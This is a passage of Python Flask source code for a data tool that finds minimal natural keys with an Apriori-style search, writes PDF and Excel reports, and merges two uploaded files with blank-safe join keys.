        return jsonify({'error': 'Please select an ID column to identify duplicate records'}), 400
        
    # Get duplicate columns selection (required, can be multiple)
    duplicate_columns = request.form.getlist('duplicate_columns[]')
    treat_blank_as_value = request.form.get('treat_blank_as_value', 'true').lower() != 'false'
        
    if not duplicate_columns:
        return jsonify({'error': 'Please select at least one column to check for duplicates'}), 400
        
    session_id, upload_path, filename = store_upload(file, 'duplicates')
        
    progress_queue = open_job(session_id)
    start_job(find_duplicates_async, upload_path, id_column, duplicate_columns, progress_queue, session_id, treat_blank_as_value)
        
    return job_started(session_id)
    
def generate_natural_key_report(output_path, original_rows, duplicate_count, rows_analyzed,
                                 selected_columns, minimal_combinations, primary_combo,
                                 sample_data, source_filename):
    """
    Generate a professional PDF report for Natural Key Analysis results.

    Args:
        output_path: Path to save the PDF file
        original_rows: Total records in source file
        duplicate_count: Number of duplicate records excluded
        rows_analyzed: Records after duplicate exclusion
        selected_columns: List of columns evaluated
        minimal_combinations: List of all minimal key combinations found
        primary_combo: The recommended primary key combination
        sample_data: Sample DataFrame showing unique IDs (first 20 rows)
        source_filename: Original filename for reference
    """
    doc = SimpleDocTemplate(output_path, pagesize=letter,
                            rightMargin=0.75*inch, leftMargin=0.75*inch,
                            topMargin=0.75*inch, bottomMargin=0.75*inch)

    # Custom styles
    styles = getSampleStyleSheet()

    title_style = ParagraphStyle(
        'CustomTitle',
        parent=styles['Heading1'],
        fontSize=24,
        spaceAfter=30,
        textColor=colors.HexColor('#667eea'),
        alignment=TA_CENTER
    )

    heading_style = ParagraphStyle(
        'CustomHeading',
        parent=styles['Heading2'],
        fontSize=14,
        spaceBefore=20,
        spaceAfter=10,
        textColor=colors.HexColor('#333333'),
        borderPadding=5
    )


    body_style = ParagraphStyle(
        'CustomBody',
        parent=styles['Normal'],
        fontSize=10,
        spaceAfter=8,
        leading=14
    )

    note_style = ParagraphStyle(
        'NoteStyle',
        parent=styles['Normal'],
        fontSize=9,
        textColor=colors.HexColor('#666666'),
        spaceAfter=6,
        leading=12
    )

    # Build document content
    story = []

    # Title
    story.append(Paragraph("Natural Key Analysis Report", title_style))
    story.append(Paragraph(f"Generated: {datetime.now().strftime('%B %d, %Y at %I:%M %p')}",
                          ParagraphStyle('DateStyle', parent=styles['Normal'],
                                        alignment=TA_CENTER, textColor=colors.gray, fontSize=10)))
    story.append(Spacer(1, 20))

    # Executive Summary Section
    story.append(Paragraph("Executive Summary", heading_style))

    if len(primary_combo) == 1:
        summary_text = f"""
        Analysis of <b>{pdf_text(str(source_filename))}</b> identified <b>{pdf_text(str(primary_combo[0]))}</b> as a single-column
        natural key capable of uniquely identifying all {rows_analyzed:,} records. This column can serve
        as a primary key without requiring additional columns.
        """
    else:
        combo_text = " + ".join([f"<b>{pdf_text(str(col))}</b>" for col in primary_combo])
        summary_text = f"""
        Analysis of <b>{pdf_text(str(source_filename))}</b> determined that a composite key of {len(primary_combo)} columns
        ({combo_text}) is required to uniquely identify all {rows_analyzed:,} records.
        No single column provides unique identification.
        """
    story.append(Paragraph(summary_text, body_style))

    if len(minimal_combinations) > 1:
        story.append(Paragraph(f"<b>{len(minimal_combinations)} alternative key combinations</b> were identified, "
                              f"all achieving the same minimum key size of {len(primary_combo)} column(s).", body_style))

    story.append(Spacer(1, 15))

    # Data Overview Section
    story.append(Paragraph("Data Overview", heading_style))

    overview_data = [
        ['Metric', 'Value'],
        ['Source File', source_filename],
        ['Total Records', f'{original_rows:,}'],
        ['Duplicate Records Excluded', f'{duplicate_count:,}'],
        ['Records Analyzed', f'{rows_analyzed:,}'],
        ['Columns Evaluated', f'{len(selected_columns)}'],
        ['Minimum Key Size Required', f'{len(primary_combo)} column(s)'],
        ['Valid Key Combinations Found', f'{len(minimal_combinations)}']
    ]

    overview_table = Table(overview_data, colWidths=[2.5*inch, 4*inch])
    overview_table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#667eea')),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
        ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
        ('FONTSIZE', (0, 0), (-1, 0), 10),
        ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
        ('FONTNAME', (0, 1), (0, -1), 'Helvetica-Bold'),
        ('FONTSIZE', (0, 1), (-1, -1), 10),
        ('BOTTOMPADDING', (0, 0), (-1, 0), 10),
        ('TOPPADDING', (0, 0), (-1, 0), 10),
        ('BOTTOMPADDING', (0, 1), (-1, -1), 6),
        ('TOPPADDING', (0, 1), (-1, -1), 6),
        ('BACKGROUND', (0, 1), (-1, -1), colors.HexColor('#f8f9ff')),
        ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor('#e0e0e0')),
        ('ROWBACKGROUNDS', (0, 1), (-1, -1), [colors.HexColor('#f8f9ff'), colors.white])
    ]))
    story.append(overview_table)
    story.append(Spacer(1, 20))

    # Primary Key Recommendation
    story.append(Paragraph("Primary Key Recommendation", heading_style))

    primary_key_data = [['Rank', 'Key Columns', 'Column Count']]
    primary_key_data.append(['Primary', ', '.join(primary_combo), str(len(primary_combo))])

    primary_table = Table(primary_key_data, colWidths=[1*inch, 4.5*inch, 1*inch])
    primary_table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#28a745')),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
        ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
        ('FONTSIZE', (0, 0), (-1, -1), 10),
        ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
        ('ALIGN', (-1, 0), (-1, -1), 'CENTER'),
        ('BOTTOMPADDING', (0, 0), (-1, -1), 8),
        ('TOPPADDING', (0, 0), (-1, -1), 8),
        ('BACKGROUND', (0, 1), (-1, -1), colors.HexColor('#d4edda')),
        ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor('#28a745'))
    ]))
    story.append(primary_table)

    story.append(Spacer(1, 10))
    story.append(Paragraph("<b>Implementation:</b> Concatenate values from the key columns above to generate "
                          "a unique identifier for each record. The accompanying Excel file includes a "
                          "pre-computed <i>Unique_ID</i> column.", note_style))
    story.append(Spacer(1, 15))

    # Alternative Key Candidates (if any)
    if len(minimal_combinations) > 1:
        story.append(Paragraph("Alternative Key Candidates", heading_style))
        story.append(Paragraph("The following combinations also uniquely identify all records with the same "
                              "minimum column count:", body_style))

        alt_data = [['Candidate', 'Key Columns', 'Column Count']]
        for idx, combo in enumerate(minimal_combinations[1:], 2):
            alt_data.append([f'#{idx}', ', '.join(combo), str(len(combo))])

        alt_table = Table(alt_data, colWidths=[1*inch, 4.5*inch, 1*inch])
        alt_table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#ffc107')),
            ('TEXTCOLOR', (0, 0), (-1, 0), colors.HexColor('#333333')),
            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
            ('FONTSIZE', (0, 0), (-1, -1), 10),
            ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
            ('ALIGN', (-1, 0), (-1, -1), 'CENTER'),
            ('BOTTOMPADDING', (0, 0), (-1, -1), 6),
            ('TOPPADDING', (0, 0), (-1, -1), 6),
            ('BACKGROUND', (0, 1), (-1, -1), colors.HexColor('#fff3cd')),
            ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor('#ffc107')),
            ('ROWBACKGROUNDS', (0, 1), (-1, -1), [colors.HexColor('#fff3cd'), colors.HexColor('#fffef5')])
        ]))
        story.append(alt_table)
        story.append(Spacer(1, 15))

    # Columns Evaluated
    story.append(Paragraph("Columns Evaluated", heading_style))

    # Display columns in a multi-column layout
    cols_per_row = 3
    col_rows = [selected_columns[i:i+cols_per_row] for i in range(0, len(selected_columns), cols_per_row)]
    # Pad the last row if needed
    if col_rows and len(col_rows[-1]) < cols_per_row:
        col_rows[-1].extend([''] * (cols_per_row - len(col_rows[-1])))

    if col_rows:
        col_table = Table(col_rows, colWidths=[2.17*inch] * cols_per_row)
        col_table.setStyle(TableStyle([
            ('FONTSIZE', (0, 0), (-1, -1), 9),
            ('BOTTOMPADDING', (0, 0), (-1, -1), 4),
            ('TOPPADDING', (0, 0), (-1, -1), 4),
            ('TEXTCOLOR', (0, 0), (-1, -1), colors.HexColor('#333333')),
            ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor('#e0e0e0')),
            ('BACKGROUND', (0, 0), (-1, -1), colors.HexColor('#f8f9ff'))
        ]))
        story.append(col_table)
    story.append(Spacer(1, 20))

    # Sample Unique Identifiers
    story.append(Paragraph("Sample Unique Identifiers", heading_style))
    story.append(Paragraph("Preview of the first 20 records with computed unique identifiers:", body_style))

    # Prepare sample data table
    if sample_data is not None and len(sample_data) > 0:
        sample_cols = list(sample_data.columns)
        sample_header = [sample_cols]
        sample_rows = sample_data.head(20).values.tolist()

        # Truncate long values for display
        for row in sample_rows:
            for i, val in enumerate(row):
                str_val = str(val) if pd.notna(val) else ''
                if len(str_val) > 25:
                    row[i] = str_val[:22] + '...'
                else:
                    row[i] = str_val

        sample_table_data = sample_header + sample_rows

        # Calculate column widths based on number of columns
        num_cols = len(sample_cols)
        available_width = 6.5 * inch
        col_width = available_width / num_cols

        sample_table = Table(sample_table_data, colWidths=[col_width] * num_cols)
        sample_table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#667eea')),
            ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
            ('FONTSIZE', (0, 0), (-1, 0), 8),
            ('FONTSIZE', (0, 1), (-1, -1), 7),
            ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
            ('BOTTOMPADDING', (0, 0), (-1, -1), 4),
            ('TOPPADDING', (0, 0), (-1, -1), 4),
            ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor('#e0e0e0')),
            ('ROWBACKGROUNDS', (0, 1), (-1, -1), [colors.white, colors.HexColor('#f8f9ff')])
        ]))
        story.append(sample_table)

    story.append(Spacer(1, 20))

    # Algorithm Explanation
    story.append(Paragraph("Methodology", heading_style))
    story.append(Paragraph("""
    This analysis employed the <b>Apriori algorithm</b> for efficient discovery of minimal unique column
    combinations. The algorithm operates in levels, first testing single columns, then progressively
    larger combinations. Key optimization: if a column set is unique, no superset is evaluated
    (as it cannot be minimal). This approach ensures computational efficiency while guaranteeing
    discovery of all truly minimal natural keys.
    """, body_style))

    story.append(Spacer(1, 15))

    # Footer
    story.append(Paragraph("─" * 80, ParagraphStyle('Line', alignment=TA_CENTER, textColor=colors.lightgrey)))
    story.append(Spacer(1, 5))
    story.append(Paragraph("Generated by DataDragon - Natural Key Analysis Tool",
                          ParagraphStyle('Footer', alignment=TA_CENTER, fontSize=9, textColor=colors.gray)))

    # Build PDF
    doc.build(story)


def find_minimal_keys(df, columns, max_size=5, max_keys=10, max_candidates=20000, time_budget_s=30,
                      sample_rows=50000, progress=None):
    """Minimal column combinations that identify every row of ``df`` (Apriori search).

    Only combinations whose every smaller subset is NOT unique are tried, so every key found is minimal.
    Each column is turned into integer codes once; a candidate's codes are combined with numpy instead of calling
    ``duplicated()`` on a frame. Large frames are screened on their first ``sample_rows`` rows: a repeat there is
    a repeat everywhere, and only a combination that passes the screen is confirmed on all rows.

    Returns {'keys': [[col, ...], ...], 'truncated': bool, 'reason': str}. ``truncated`` is True when the search
    stopped at ``max_candidates`` tested combinations or ``time_budget_s`` seconds, so a missing key does not
    prove there is none. ``progress(stage, pct, message, current, total)`` gets pct 0-100 for this search.
    """
    deadline = time.monotonic() + time_budget_s
    say = progress or (lambda *a, **k: None)
    n_rows = len(df)
    codes, card, usable = {}, {}, []
    truncated, reason = False, ''
    for c in dict.fromkeys(columns):
        if time.monotonic() > deadline:       # a very wide file: stop preparing columns and say so
            truncated, reason = True, f'time budget of {time_budget_s} seconds reached'
            break
        coded, uniques = pd.factorize(df[c], use_na_sentinel=False)
        if n_rows > 1 and len(uniques) <= 1:
            continue                           # a constant column can never be part of a minimal key
        codes[c], card[c] = coded, len(uniques)
        usable.append(c)
    sample = min(n_rows, sample_rows)

    def combined(cols, rows):
        acc, size = codes[cols[0]][:rows], card[cols[0]]
        for c in cols[1:]:
            acc, uniq = pd.factorize(acc * card[c] + codes[c][:rows])
            size = len(uniq)
        return size

    def is_unique(cols):
        if sample < n_rows and combined(cols, sample) != sample:
            return False          # a repeat inside the sample is a repeat in the full data
        return combined(cols, n_rows) == n_rows

    found, non_unique, tested = [], set(), 0
    n = len(usable)
    say('level1', 10, f'Level 1: Testing {n} single columns...', 0, n)
    for idx, col in enumerate(usable):
        tested += 1
        if is_unique([col]):
            found.append([col])
            say('level1', 10 + int((idx + 1) / max(n, 1) * 15), f'Found unique key: {col}', idx + 1, n)
        else:
            non_unique.add(frozenset([col]))
            if (idx + 1) % 3 == 0 or idx == n - 1:
                say('level1', 10 + int((idx + 1) / max(n, 1) * 15),
                    f'Level 1: Tested {idx + 1}/{n} columns. Found {len(found)} key(s).', idx + 1, n)

    top = min(n, max_size)
    level_range = 65 / max(top - 1, 1)
    for k in range(2, top + 1):
        if not non_unique or len(found) >= max_keys or truncated:
            break
        start = 25 + int((k - 2) * level_range)
        end = 25 + int((k - 1) * level_range)
        say(f'level{k}', start, f'Level {k}: Generating {k}-column candidates using Apriori pruning...')
        pool = sorted({c for combo in non_unique for c in combo})
        next_non_unique, examined = set(), 0
        for combo in combinations(pool, k):
            examined += 1
            if examined % 256 == 0 and time.monotonic() > deadline:
                truncated, reason = True, f'time budget of {time_budget_s} seconds reached'
                break
            if not all(frozenset(sub) in non_unique for sub in combinations(combo, k - 1)):
                continue                       # a smaller part is already a key (or was never non-unique)
            if len(found) >= max_keys:
                break
            if tested >= max_candidates:
                truncated, reason = True, f'candidate limit of {max_candidates:,} reached'
                break
            tested += 1
            cols = list(combo)
            if is_unique(cols):
                found.append(cols)
                say(f'level{k}', start + 2, f'Found key: {" + ".join(cols)}')
            else:
                next_non_unique.add(frozenset(cols))
            if tested % 50 == 0:
                say(f'level{k}', min(end, start + 2 + (tested % 1000) // 50), f'Level {k}: tested {tested:,} combinations. '
                    f'Found {len(found)} key(s).')
        non_unique = next_non_unique
    return {'keys': found, 'truncated': truncated, 'reason': reason}


@job_worker('upload_path')
def find_unique_identifier_async(upload_path, selected_columns, progress_queue, session_id, allow_null_keys=False):
    """Find minimal set of columns that create unique identifiers in background thread with progress tracking"""
    send_progress = progress_sender(progress_queue, session_id)
        
    send_progress('loading', 0, 100, 'Reading file into memory...', 5)
        
    # Read file into memory
    df = read_data_file(upload_path)
        
    original_row_count = len(df)
    send_progress('loading', 50, 100, f'File loaded: {len(df):,} rows, {len(df.columns)} columns', 10)
        
    # Step 1: Filter out fully duplicate rows
    send_progress('filtering', 0, 100, 'Identifying fully duplicate rows...', 15)
    duplicate_count = int(df.duplicated().sum())
        
    keyed = df
    if duplicate_count > 0:
        # Keys are searched on the de-duplicated rows; the export keeps every row and flags the repeats
        keyed = df.drop_duplicates(keep='first')
        send_progress('filtering', 100, 100, f'{duplicate_count:,} fully duplicate rows excluded from the key search. {len(keyed):,} rows analyzed.', 20)
    else:
        send_progress('filtering', 100, 100, 'No fully duplicate rows found.', 20)
        
    # Validate selected columns exist
    if not selected_columns:
        raise UserError("Please select at least one column to analyze.")
        
    invalid_columns = [col for col in selected_columns if col not in df.columns]
    if invalid_columns:
        raise UserError(f"Columns not found in file: {', '.join(invalid_columns)}")
        
    # Columns with blanks make poor keys; skip them unless the owner allows it
    skipped_null_columns = [] if allow_null_keys else [c for c in selected_columns if keyed[c].isna().any()]
    selected_columns = [c for c in selected_columns if c not in skipped_null_columns]
    if skipped_null_columns:
        send_progress('analyzing', 0, 100, f'Skipping {len(skipped_null_columns)} column(s) with blank values', 24)
    if not selected_columns:
        raise UserError("Every selected column contains blank values, so none can be used as a key. "
                         "Select other columns or allow blank values in keys.")

    # Step 2: Find minimal unique combinations using Apriori pruning algorithm
    # This algorithm ensures we find truly MINIMAL keys by only expanding non-unique combinations
    send_progress('analyzing', 0, 100, f'Analyzing {len(selected_columns)} selected columns using Apriori algorithm...', 25)

    def search_progress(stage, pct, message, current=0, total=0):
        send_progress('analyzing', pct, 100, message, 30 + int(pct * 0.4))

    search = find_minimal_keys(keyed, selected_columns, progress=search_progress)
    minimal_combinations = search['keys']
    if search['truncated']:
        note_warning(session_id, f"The key search stopped early ({search['reason']}), so there may be more keys.")

    if not minimal_combinations:
        if search['truncated']:
            raise UserError(f"No key was found before the search stopped ({search['reason']}). "
                             "Select fewer columns, or include a column that is already close to unique.")
        raise UserError("No combination of selected columns can create unique identifiers for all rows.")
        
    send_progress('analyzing', 100, 100, f'Found {len(minimal_combinations)} minimal key candidate(s)', 70)

    # Step 3: Generate results
    send_progress('saving', 0, 100, 'Preparing output files...', 75)

    # Use first minimal combination to create unique IDs
    primary_combo = minimal_combinations[0]
    # New columns never overwrite the user's own columns of the same name
    id_col = _free_name('Unique_ID', df.columns)
    dup_col = _free_name('_is_duplicate', list(df.columns) + [id_col])
    original_columns = list(df.columns)
    df[id_col] = df[primary_combo].apply(
        lambda row: '|||'.join(str(v) if pd.notna(v) else '' for v in row),
        axis=1
    )
    # Every row is kept; exact repeats of an earlier row are flagged instead of silently dropped
    df[dup_col] = df[original_columns].duplicated(keep='first')

    # Sample of unique IDs for PDF report
    sample_df = df[primary_combo + [id_col]].head(100).copy()

    # Get source filename for report
    source_filename = os.path.basename(upload_path)
    # Remove session prefix if present
    if '_' in source_filename:
        source_filename = '_'.join(source_filename.split('_')[2:]) or source_filename

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    output_basename = f"natural_key_analysis_{timestamp}"

    # Generate PDF Report
    send_progress('saving', 25, 100, 'Generating PDF report...', 80)
    pdf_path = job_output_path(session_id, f"{output_basename}_report.pdf")

    generate_natural_key_report(
        output_path=pdf_path,
        original_rows=original_row_count,
        duplicate_count=duplicate_count,
        rows_analyzed=len(keyed),
        selected_columns=selected_columns,
        minimal_combinations=minimal_combinations,
        primary_combo=primary_combo,
        sample_data=sample_df,
        source_filename=source_filename
    )

    # Generate Excel Data File
    send_progress('saving', 60, 100, 'Generating Excel data file...', 88)
    excel_path = job_output_path(session_id, f"{output_basename}_data.xlsx")

    alternatives_data = []
    for idx, combo in enumerate(minimal_combinations, 1):
        alternatives_data.append({
            'Candidate': f'#{idx}' if idx > 1 else 'Primary',
            'Key Columns': ', '.join(combo),
            'Column Count': len(combo)
        })
    alternatives_df = pd.DataFrame(alternatives_data)
    key_log = make_log('Natural Key Finder', original_row_count, len(df),
                       {'selected_columns': selected_columns, 'allow_null_keys': allow_null_keys,
                        'skipped_columns_with_blanks': skipped_null_columns, 'key': primary_combo,
                        'exact_duplicate_rows': duplicate_count}, session_id)
    data_too_big = sheet_too_big(df)
    if data_too_big:
        # More rows than an Excel sheet holds: the data goes into the zip as CSV instead
        excel_path = job_output_path(session_id, f"{output_basename}_data.csv")
        sanitize_csv(df).to_csv(excel_path, index=False)
        note_warning(session_id, f"The data has {len(df):,} rows, more than an Excel sheet can hold, so it is "
                                 "included as a CSV file (the key candidates are in a second CSV).")
    else:
        with excel_writer(excel_path) as writer:
            df.to_excel(writer, sheet_name='Data with Unique IDs', index=False)
            alternatives_df.to_excel(writer, sheet_name='Key Candidates', index=False)
            log_frame(key_log).to_excel(writer, sheet_name=LOG_SHEET, index=False)

    # Create ZIP package containing both files
    send_progress('saving', 85, 100, 'Packaging results...', 93)
    zip_path = job_output_path(session_id, f"{output_basename}.zip")

    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.write(pdf_path, f"{output_basename}_report.pdf")
        zipf.write(excel_path, f"{output_basename}_data.{'csv' if data_too_big else 'xlsx'}")
        if data_too_big:
            zipf.writestr(f"{output_basename}_key_candidates.csv", sanitize_csv(alternatives_df).to_csv(index=False))
            zipf.writestr('_DataDragon_Log.json', log_as_json(key_log))

    # Clean up individual files (keep only ZIP)
    os.remove(pdf_path)
    os.remove(excel_path)

    download_url = job_download_url(session_id, f"{output_basename}.zip")

    send_progress('saving', 100, 100, 'Results packaged successfully', 95)

    # Clean up DataFrames
    del df
    del alternatives_df
    del sample_df
    os.remove(upload_path)

    # Send completion message
    final_message = {
        'stage': 'done',
        'current': 100,
        'total': 100,
        'percentage': 100,
        'message': 'Analysis complete',
        'download_url': download_url,
        'output_filename': f"{output_basename}.zip",
        'original_rows': original_row_count,
        'duplicate_rows_removed': duplicate_count,
        'rows_after_filtering': original_row_count - duplicate_count,
        'selected_columns_count': len(selected_columns),
        'minimal_columns_count': len(primary_combo),
        'minimal_columns': primary_combo,
        'alternatives_count': len(minimal_combinations),
        'alternatives': minimal_combinations
    }

    progress_queue.put(final_message)

        
@app.route('/find-unique-identifier', methods=['POST'])
@rate_limit(max_requests=RATE_LIMIT_REQUESTS, window=RATE_LIMIT_WINDOW)
@api_errors
def find_unique_identifier():
    """Find unique identifier columns in uploaded file - returns session_id for progress tracking"""
    file = check_upload('file', ('.xlsx', '.xls', '.csv'), 'Please upload an Excel or CSV file')
        
    # Get selected columns (required, can be multiple)
    selected_columns = request.form.getlist('selected_columns[]')
        
    if not selected_columns:
        return jsonify({'error': 'Please select at least one column to analyze'}), 400
        
    session_id, upload_path, filename = store_upload(file, 'unique_id')
        
    progress_queue = open_job(session_id)
    allow_null_keys = request.form.get('allow_null_keys', '').lower() in ('1', 'true', 'on', 'yes')
    start_job(find_unique_identifier_async, upload_path, selected_columns, progress_queue, session_id,
              allow_null_keys)
        
    return job_started(session_id)
    
@app.route('/data-merge')
def data_merge():
    return render_template('data_merge.html')

class _BlankKey:
    """Stands in for a blank join key. Every instance is unique (equality is identity), so a blank key can
    never match anything; pandas would otherwise join NaN to NaN and multiply blank-key rows.
    Outer joins sort their keys, so instances are orderable: after every real key, then by creation."""
    __slots__ = ('n',)
    _serial = itertools_count()

    def __init__(self):
        self.n = next(_BlankKey._serial)

    def __lt__(self, other):
        return isinstance(other, _BlankKey) and self.n < other.n

    def __gt__(self, other):
        return not isinstance(other, _BlankKey) or self.n > other.n

    def __le__(self, other):
        return self is other or self < other

    def __ge__(self, other):
        return self is other or self > other


def _null_safe_keys(series):
    """Object copy of a key column in which every blank is replaced by its own _BlankKey."""
    values = series.to_numpy(dtype=object, copy=True)
    blank = series.isna().to_numpy()
    placeholders = np.empty(int(blank.sum()), dtype=object)
    for i in range(len(placeholders)):
        placeholders[i] = _BlankKey()
    values[blank] = placeholders
    return values


def _restore_blank_keys(df, columns):
    for column in set(columns):
        if column in df.columns:
            df[column] = [np.nan if isinstance(v, _BlankKey) else v for v in df[column].to_numpy(dtype=object)]


def _free_name(wanted, taken):
    """`wanted`, extended with underscores until it is not one of the user's column names."""
    name = wanted
    while name in set(map(str, taken)):
        name += '_'
    return name


@job_worker('left_file_path', 'right_file_path')
def merge_files_async(left_file_path, right_file_path, left_key, right_key, join_type, left_columns, right_columns, duplicate_handling, progress_queue, session_id):
    """Merge two files in background thread with progress tracking"""
    send_progress = progress_sender(progress_queue, session_id)
        
    send_progress('loading', 0, 100, 'Reading left file...', 5)
        
    # Read left file
    df_left = read_data_file(left_file_path)
        
    send_progress('loading', 50, 100, 'Reading right file...', 10)
        
    # Read right file
    df_right = read_data_file(right_file_path)
    align_key_types(df_left, [left_key], df_right, [right_key])
        
    send_progress('loading', 100, 100, f'Files loaded: Left {len(df_left):,} rows, Right {len(df_right):,} rows', 15)
        
    # Validate key columns exist
    if left_key not in df_left.columns:
        raise UserError(f"Key column '{left_key}' not found in left file")
    if right_key not in df_right.columns:
        raise UserError(f"Key column '{right_key}' not found in right file")
        
    # Validate selected columns exist
    if left_columns:
        invalid_left = [col for col in left_columns if col not in df_left.columns]
        if invalid_left:
            raise UserError(f"Columns not found in left file: {', '.join(invalid_left)}")
        
    if right_columns:
        invalid_right = [col for col in right_columns if col not in df_right.columns]
        if invalid_right:
            raise UserError(f"Columns not found in right file: {', '.join(invalid_right)}")
        
    send_progress('preparing', 0, 100, 'Preparing data for merge...', 20)
        
    # Select columns to include (if specified)
    if left_columns:
        # Always include the key column
        if left_key not in left_columns:
            left_columns = [left_key] + left_columns
        df_left = df_left[left_columns]
        
    if right_columns:
        # Always include the key column
        if right_key not in right_columns:
            right_columns = [right_key] + right_columns
        df_right = df_right[right_columns]
        
    # Handle duplicate keys. Blank keys are not keys: rows without one are never duplicates of each other.
    left_has_key = df_left[left_key].notna()
    right_has_key = df_right[right_key].notna()
    if duplicate_handling == 'error':
        left_dupes = int((left_has_key & df_left[left_key].duplicated()).sum())
        right_dupes = int((right_has_key & df_right[right_key].duplicated()).sum())
        if left_dupes > 0 or right_dupes > 0:
            raise UserError(f"Duplicate keys found: Left file has {left_dupes} duplicates, Right file has {right_dupes} duplicates. Please handle duplicates first.")
    elif duplicate_handling == 'keep_first':
        df_left = df_left[~(left_has_key & df_left[left_key].duplicated(keep='first'))]
        df_right = df_right[~(right_has_key & df_right[right_key].duplicated(keep='first'))]
        
    send_progress('merging', 0, 100, f'Performing {join_type} join...', 30)
        
    # Perform merge
    # Map join types
    join_type_map = {
        'left': 'left',
        'right': 'right',
        'inner': 'inner',
        'outer': 'outer'
    }
    how = join_type_map.get(join_type, 'inner')
        
    # Blank keys never match: they are swapped for unique placeholders for the join and restored after.
    indicator = _free_name('__dd_merge__', list(df_left.columns) + list(df_right.columns))
    left_for_merge = df_left.copy()
    right_for_merge = df_right.copy()
    left_for_merge[left_key] = _null_safe_keys(df_left[left_key])
    right_for_merge[right_key] = _null_safe_keys(df_right[right_key])
    merged_df = pd.merge(
        left_for_merge,
        right_for_merge,
        left_on=left_key,
        right_on=right_key,
        how=how,
        suffixes=('_left', '_right'),
        indicator=indicator
    )
    _restore_blank_keys(merged_df, [left_key, right_key])
    matched = int((merged_df[indicator] == 'both').sum())
    merged_df = merged_df.drop(columns=[indicator])
    del left_for_merge, right_for_merge
        
    send_progress('merging', 100, 100, f'Merged: {len(merged_df):,} rows', 60)
        
    # Join statistics, counted on the input rows so they can never go negative
    left_total = len(df_left)
    right_total = len(df_right)
    merged_total = len(merged_df)
    left_keys = df_left[left_key]
    right_keys = df_right[right_key]
    left_present = left_keys.notna()
    right_present = right_keys.notna()
    left_with_partner = int((left_present & left_keys.isin(right_keys[right_present])).sum())
    right_with_partner = int((right_present & right_keys.isin(left_keys[left_present])).sum())
    unmatched_left = left_total - left_with_partner
    unmatched_right = right_total - right_with_partner
        
    # Repeated keys multiply rows: the file being joined onto (left; right for a right join) gets more merged
    # rows than it has rows with a partner. A many-to-one lookup (orders -> customers) does not trigger this.
    if how == 'right':
        base_with_partner, base_side, other_side = right_with_partner, 'right', 'left'
    else:
        base_with_partner, base_side, other_side = left_with_partner, 'left', 'right'
    multiplication_factor = round(matched / base_with_partner, 2) if base_with_partner else 1.0
    merge_warning = None
    if matched > base_with_partner:
        merge_warning = (f"Some keys appear more than once in the {other_side} file, so rows were multiplied: "
                         f"{base_with_partner:,} {base_side} rows with a partner produced {matched:,} merged rows. "
                         f"Choose 'keep first' or 'error' for duplicates to avoid this.")
        
    send_progress('saving', 0, 100, 'Saving results...', 70)
        
    # Create summary DataFrame
    summary_data = {
        'Metric': [
            'Left File Rows',
            'Right File Rows',
            'Merged Rows',
            'Matched Rows',
            'Unmatched (Left)',
            'Unmatched (Right)',
            'Join Type'
        ],
        'Value': [
            left_total,
            right_total,
            merged_total,
            matched,
            unmatched_left,
            unmatched_right,
            join_type.upper()
        ]
    }
    summary_df = pd.DataFrame(summary_data)
        
    # Save to Excel
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    output_filename = f"merged_{timestamp}"
    output_path = job_output_path(session_id, f"{output_filename}.xlsx")
        
    output_path = write_sheets(output_path, [('Merged Data', merged_df), ('Join Summary', summary_df)], session_id,
                               log=make_log('Data Merge', len(df_left) + len(df_right), len(merged_df),
                                            {'left_rows': len(df_left), 'right_rows': len(df_right), 'join_type': join_type,
                                             'left_key': left_key, 'right_key': right_key, 'left_columns': left_columns,
                                             'right_columns': right_columns, 'duplicate_handling': duplicate_handling},
                                            session_id))

    download_url = job_download_url(session_id, os.path.basename(output_path))
        
    send_progress('saving', 100, 100, 'Results saved...', 95)
        
    # Prepare preview data before cleanup
    preview_data = df_preview_text(merged_df, 100)
        
    # Clean up
    del df_left
    del df_right
    del merged_df
    os.remove(left_file_path)
    os.remove(right_file_path)
        
    # Send completion message
    final_message = {
        'stage': 'done',
        'current': 100,
        'total': 100,
        'percentage': 100,
        'message': 'Complete!',
        'download_url': download_url,
        'output_filename': os.path.basename(output_path),
        'summary': {
            'left_rows': int(left_total),
            'right_rows': int(right_total),
            'merged_rows': int(merged_total),
            'matched': int(matched),
            'unmatched_left': int(unmatched_left),
            'unmatched_right': int(unmatched_right),
            'multiplication_factor': multiplication_factor,
            'join_type': join_type
        },
        'preview': preview_data
    }
    if merge_warning:
        final_message['warning'] = merge_warning
        
    progress_queue.put(final_message)
        
        
@app.route('/merge-data', methods=['POST'])
@rate_limit(max_requests=RATE_LIMIT_REQUESTS, window=RATE_LIMIT_WINDOW)
@api_errors
def merge_data():
    """Merge two uploaded files - returns session_id for progress tracking"""
    if 'left_file' not in request.files or 'right_file' not in request.files:
        return jsonify({'error': 'Please upload both left and right files'}), 400
        
    left_file = request.files['left_file']
    right_file = request.files['right_file']
        
    if left_file.filename == '' or right_file.filename == '':
        return jsonify({'error': 'Both files must be selected'}), 400
        
    # Validate file extensions
    if not (left_file.filename.endswith(('.xlsx', '.xls', '.csv')) and 
            right_file.filename.endswith(('.xlsx', '.xls', '.csv'))):
